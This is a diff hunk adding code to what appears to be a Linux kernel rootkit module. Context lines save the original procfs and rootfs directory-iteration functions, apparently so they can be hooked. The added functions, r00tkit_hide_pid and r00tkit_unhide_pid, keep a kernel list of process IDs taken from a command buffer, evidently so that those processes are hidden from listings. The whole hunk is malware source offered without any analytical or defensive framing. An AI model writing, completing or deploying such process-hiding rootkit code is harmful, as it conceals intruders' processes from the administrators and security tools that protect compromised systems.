@@ -211,3 +211,47 @@ static int (*org_rootfs_iterate)(struct file *fp,struct dir_context *ctx);
 
 static filldir_t org_procfs_filldir;
 static filldir_t org_rootfs_filldir;
+
+
+
+/*
+###########################################
+###########################################
+*/
+
+
+LIST_HEAD(hidden_pids_listhead);
+
+static int r00tkit_hide_pid(const char *buf,size_t count)
+{
+	struct hidden_pids *hidden_pid;
+
+	hidden_pid = (struct hidden_pids *)kzalloc(sizeof(struct hidden_pids),GFP_KERNEL);
+
+	if (hidden_pid == NULL)
+		return 0;
+
+	list_add(&hidden_pid->pids_list,&hidden_pids_listhead);
+
+	strncpy(hidden_pid->pidstr,&buf[HIDEPID_CMD_LEN],MIN(count - HIDEPID_CMD_LEN,PID_STR_MAXLEN - 1));
+
+	return 1;
+}
+
+
+static int r00tkit_unhide_pid(const char *buf,size_t count)
+{
+	struct hidden_pids *hidden_pid,*next_hidden_pid;
+
+	list_for_each_entry_safe(hidden_pid,next_hidden_pid,&hidden_pids_listhead,pids_list)
+	{
+		if (strncmp(hidden_pid->pidstr,&buf[UNHIDEPID_CMD_LEN],MIN(count - UNHIDEPID_CMD_LEN,PID_STR_MAXLEN - 1)) == 0)
+		{
+			list_del(&hidden_pid->pids_list);
+			kfree(hidden_pid);
+			return 1;
+		}
+	}
+
+	return 0;
+}
